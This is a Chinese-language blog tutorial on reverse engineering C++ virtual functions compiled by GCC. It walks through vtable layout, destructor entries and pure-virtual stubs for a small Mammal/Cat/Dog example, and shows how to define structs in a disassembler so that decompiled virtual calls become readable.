      <a class="article-title" href="/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/">C++虚函数逆向分析（一）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>本文以一个简单C++例子进行介绍。</p>
<blockquote>
<p>示例代码编译时没有使用RTTI，也没有使用异常机制<br>下文中的样例在x86平台上测试<br>所有二进制文件已经被strip了<br>大多数虚函数的实现细节都没有标准化，并且不同编译器之间可能会有所不一样。因此，我们将专注于GCC的行为。</p>
</blockquote>
<p>大多数情况下，没有办法让一个虚函数的调用，变换为一个对非虚函数的调用（反虚拟化）。因为，需要的信息在静态编译中是不全的，只有在运行时才会存在。因此，逆向虚函数时，目标是判断哪些函数会在特定的情况下被调用。后面会学习其他技巧，来进一步缩小范围。</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>先看一个小程序：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Mammal</span> &#123;</span></span><br><span class="line">    Mammal() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mammal::Mammal\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Mammal() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mammal::~Mammal\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">move</span><span class="params">()</span> </span>&#123; walk(); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Cat</span> :</span> Mammal &#123;</span><br><span class="line">    Cat() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat::Cat\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Cat() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat::~Cat\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat::run\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cat::walk\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dog</span> :</span> Mammal &#123;</span><br><span class="line">    Dog() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog::Dog\n&quot;</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Dog() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog::~Dog\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog::run\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog::walk\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Mammal *m;</span><br><span class="line">    <span class="keyword">if</span> (rand() % <span class="number">2</span>) &#123;</span><br><span class="line">        m = <span class="keyword">new</span> Cat();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        m = <span class="keyword">new</span> Dog();</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;walk();</span><br><span class="line">    <span class="keyword">delete</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>m</code>是<code>Cat</code>还是<code>Dog</code>类，取决于<code>rand</code>函数的输出。编译器无法提前预测，那么编译器如何调用合适的<code>walk</code>呢？<br>因为walk函数声明为了虚函数，编译器会在程序所处的内存空间中，插入一个包含函数指针的表，称为<code>虚函数表（虚表vtable）</code>；在实例化的时候，每个对象会多出一个<code>虚指针（vptr）</code>的成员，这个虚指针指向虚函数表，初始化这个虚指针的代码会被添加到类的构造函数中。这样当编译器要调用虚函数的时候，就可以通过虚指针找到对应的虚表，从而找到合适的函数。<br>具有同一个父类的子类，其虚表中函数的顺序也应该是一致的。比如，上面的例子中，Dog和Cat类都是Mammal类的子类，如果Dog类的虚表中，第一项是Dog::run的指针，第二项是Dog::walk的指针，那么Cat类的虚表中，第一项就是Cat::run的指针，第二项是Cat::walk的指针。<br>通过在<code>.rodata</code>段中寻找指向函数的偏移量，可以找到类的虚表：<br><img src="/images/cppre1/vtable1.png"><br>主函数编译之后如下：<br><img src="/images/cppre1/main1.png"><br>可以看到，程序在实例化的时候，为每个对象申请了4字节的内存空间，这和预期相符（类中没有数据成员，而编译器为我们添加了vptr）。在第21和23行中看到对虚函数的调用过程。在第21行中编译器对指针解引用，从而获得vptr；接着计算vptr+12，即访问虚表的第四项，而23行访问虚表的第二项。之后，程序调用虚表中对应项目指向的函数。<br><img src="/images/cppre1/catdogwalk.png"><br>三个虚表的第四项分别是<code>sub_8048864</code>、<code>sub_804881c</code>和<code>__cxa_pure_virtual</code>。前两个函数如上图所示，分别是Dog和Cat类中对walk函数的实现，最后一个函数就是Mammal类中对应的实现。因为Mammal类中没有定义walk的具体实现，而是声明其为纯虚函数。那么GCC就插入了一个默认的项目。现在就知道了虚表1是Mammal类的，2是Cat类的，3是Dog类的。<br>奇怪的是vtable中包含五个项目，而程序中每个类只有四个虚函数：</p>
<ul>
<li>run</li>
<li>walk</li>
<li>move</li>
<li>析构函数</li>
</ul>
<p>实际上，多出来的项目是一个”额外的”析构函数。因为GCC会在不同场景下，使用不同的析构函数。第一个析构函数只是把实例对应的所有成员清理掉，而第二个析构函数则会回收为这个实例分配的内存，也就是23行调用的函数。在某些涉及到虚继承的情况下，还会有第三种析构函数。<br>现在就清楚虚表的布局了：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| Offset | Pointer to  |</span><br><span class="line">|--------+-------------|</span><br><span class="line">|      0 | Destructor1 |</span><br><span class="line">|      4 | Destructor2 |</span><br><span class="line">|      8 | run         |</span><br><span class="line">|     12 | walk        |</span><br><span class="line">|     16 | move        |</span><br></pre></td></tr></table></figure>

<blockquote>
<p>虚表的前两个项目是空指针。这是新版本GCC的一个特征，当类具有纯虚函数时，编译器会将其析构函数替换为空指针。</p>
</blockquote>
<p>给函数重命名：<br><img src="/images/cppre1/vtable2.png"><br>由于Cat和Dog类都没有实现move方法，因此它们直接采用了Mammal类中的方法，虚表中的指针值也是一样的。</p>
<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>为了研究方便，我们定义了几个结构体。刚才我们已经分析了Mammal、Cat和Dog的成员只有vptr，因此如下定义三个结构体：<br><img src="/images/cppre1/struct.png"><br>下一步需要为每个虚表创建一个结构体。这是为了让反编译器更清楚的展示，如果m具有一个特定类型的话，哪个函数会被调用。这样阅读代码时会排除很多干扰。为了达成这个目的，需要把结构体中的每个项目命名为对应的函数名：<br><img src="/images/cppre1/struct2.png"><br>接着，修改类中虚指针的类型为指向对应虚表的指针。比如，Cat类的vptr成员，修改为<code>CatVtable *</code>类型。（修改类型：光标放在变量名上按<code>y</code>）<br><img src="/images/cppre1/vptrtype.png"><br>还可以把虚表中每个项目的类型改为函数指针，比如，<code>Dog_walk</code>的类型是<code>void (*)(Dog*)</code>，这样就更容易识别了。<br><img src="/images/cppre1/walktype.png"><br>上图是把m的类型修改为<code>Dog *</code>，也可以修改为<code>Cat *</code>，可以看到21行调用了相应的函数。<br>还可以将m修改为<code>Mammal *</code>类型，但是21行就会变成调用纯虚函数，这是不可能的，23行也会出问题，因此判断m一定不能是<code>Mammal *</code>类型。<br>这种和源代码不符的说法，可能听上去比较奇怪。实际上，这是因为在编译时，我们给m赋予的是一个编译时的类型（静态类型），但我们更关注它的动态类型（或者说是运行时的类型），因为这才是决定哪个虚函数被调用的关键。事实上，一个元素的动态类型，基本永远不可能是一个抽象类。因此如果给出的虚表中，含有一个<code>___cxa_pure_virtual</code>函数，那这个类型可能并不是他的运行时类型，可以无视。实际刚才的例子中我们完全可以不给Mammal类的虚表创建一个结构体，因为这个结构体永远都不会用到。<br>通过以上的分析，我们知道了，动态类型可能是Cat或者Dog，我们也知道了如何通过查看虚表的项目，来判断哪个函数会被调用，这是C++虚函数逆向的第一步。后面会介绍如何处理更多、更复杂的二进制程序和继承关系。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/123821.html">http://www.freebuf.com/articles/web/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/123821.html</a><br><a target="_blank" rel="noopener" href="https://alschwalm.com/blog/static/2016/12/17/reversing-c-virtual-functions/">https://alschwalm.com/blog/static/2016/12/17/reversing-c-virtual-functions/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckhe7o4kr0017chl78wgcbab0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/8/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/10/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
          </li>
        
          <li>
            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
          </li>
        
          <li>
            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
          </li>
        
          <li>
            <a href="/2020/07/06/User-namespace/">User namespace</a>
          </li>
        
          <li>
            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>